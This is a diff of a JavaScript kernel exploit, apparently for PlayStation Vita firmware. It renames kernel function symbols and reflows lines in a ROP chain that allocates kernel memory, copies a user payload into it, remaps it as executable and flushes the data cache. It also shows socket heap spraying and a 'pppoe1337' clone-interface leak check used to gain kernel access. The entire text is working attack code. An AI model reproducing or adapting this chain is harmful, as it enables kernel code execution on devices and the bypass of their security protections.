@@ -137,7 +137,7 @@ function RopChain(buf, buf_addr) {
 
       var resolve_stub = [
         movs_r0_0_pop_r3_pc,                                // pc
-        ksceKernelFreeMemBlock,                             // r3
+        sceKernelFreeMemBlock,                              // r3
         blx_r3_pop_r3_pc,                                   // pc
         0xDEADBEEF,                                         // r3
         push_r3_r4_lr_pop_r0_r1_r2_r6_r0_r1_r3_r4_r5_r6_pc, // pc
@@ -175,7 +175,7 @@ function build_krop(buf, buf_addr, payload, payload_size) {
   krop.push(SCE_KERNEL_MEMBLOCK_TYPE_KERNEL_RW);       // r1
   krop.push((payload_size + 0xfff) & ~0xfff);          // r2
   krop.push(0);                                        // r3
-  krop.push(ksceKernelAllocMemBlock);                  // r4
+  krop.push(sceKernelAllocMemBlockForKernel);          // r4
   krop.push(0xDEADBEEF);                               // r6
   krop.push(blx_r4_add_sp_c_pop_r4_r5_pc);             // pc
   krop.push(0xDEADBEEF);                               // dummy
@@ -191,7 +191,7 @@ function build_krop(buf, buf_addr, payload, payload_size) {
   krop.push(0xDEADBEEF);                               // r0
   krop.push(payload_code_block);                       // r1
   krop.push(0xDEADBEEF);                               // r2
-  krop.push(ksceKernelGetMemBlockBase);                // r4
+  krop.push(sceKernelGetMemBlockBase);                 // r4
   krop.push(payload_code_blockid);                     // r4
   krop.push(0xDEADBEEF);                               // r6
   krop.push(ldr_r0_r4_pop_r4_pc);                      // pc
@@ -204,7 +204,7 @@ function build_krop(buf, buf_addr, payload, payload_size) {
   krop.push(0xDEADBEEF);                               // r0
   krop.push(payload);                                  // r1
   krop.push(payload_size);                             // r2
-  krop.push(ksceKernelMemcpyUserToKernel);             // r3
+  krop.push(sceKernelCopyFromUser);                    // r3
   krop.push(payload_code_block);                       // r4
   krop.push(0xDEADBEEF);                               // r6
   krop.push(ldr_r0_r4_pop_r4_pc);                      // pc
@@ -217,7 +217,7 @@ function build_krop(buf, buf_addr, payload, payload_size) {
   krop.push(0xDEADBEEF);                               // r0
   krop.push(SCE_KERNEL_MEMBLOCK_TYPE_KERNEL_RX);       // r1
   krop.push(0xDEADBEEF);                               // r2
-  krop.push_sysmem(ksceKernelRemapBlock);              // r3
+  krop.push_sysmem(sceKernelRemapMemBlock);            // r3
   krop.push(payload_code_blockid);                     // r4
   krop.push(0xDEADBEEF);                               // r6
   krop.push(ldr_r0_r4_pop_r4_pc);                      // pc
@@ -230,7 +230,7 @@ function build_krop(buf, buf_addr, payload, payload_size) {
   krop.push(0xDEADBEEF);                               // r0
   krop.push((payload_size + 0x1f) & ~0x1f);            // r1
   krop.push(0xDEADBEEF);                               // r2
-  krop.push_sysmem(ksceKernelCpuDcacheWritebackRange); // r3
+  krop.push_sysmem(sceKernelDcacheCleanRangeForL1WBWA);// r3
   krop.push(payload_code_block);                       // r4
   krop.push(0xDEADBEEF);                               // r6
   krop.push(ldr_r0_r4_pop_r4_pc);                      // pc
@@ -268,8 +268,7 @@ function kxploit(caller, ver) {
   aspace32[sockname / 4] = 0;
 
   // Initialize socket
-  var sock = sceNetSyscallSocket(
-    sockname, SCE_NET_AF_INET, SCE_NET_SOCK_DGRAM, 0);
+  var sock = sceNetSyscallSocket(sockname, SCE_NET_AF_INET, SCE_NET_SOCK_DGRAM, 0);
 
   // Destroy clone interface
   if_clone_destroy(sock, "pppoe1337");
@@ -322,7 +321,7 @@ function kxploit(caller, ver) {
     spray_sock[i] = sceNetSyscallSocket(
       sockname, SCE_NET_AF_INET, SCE_NET_SOCK_DGRAM, 0);
 
-  // Heap feng shui for 3.63+ (!_dev)
+  // Heap feng shui for 3.63+
   // 0x20+0x4000+0x8+0x20+0x148+0x8+0x20+0x550+0x8+0x20+0x4000+0x8
   net_free(0);
   net_malloc(0, 0x6e8 + PLANT_SIZE);
@@ -350,8 +349,7 @@ function kxploit(caller, ver) {
   if_clone_create(sock, "pppoe1337");
 
   // Check for validity
-  if (read_string(softc_leak + 0x14) != "pppoe1337" ||
-      aspace32[(softc_leak + 0x6c) / 4] != SOFTC_SIZE - 0x80) {
+  if (read_string(softc_leak + 0x14) != "pppoe1337" || aspace32[(softc_leak + 0x6c) / 4] != SOFTC_SIZE - 0x80) {
     if_clone_destroy(sock, "pppoe1337");
     for (var i = 0; i < NUM_SLOTS; i++)
       net_free(i);
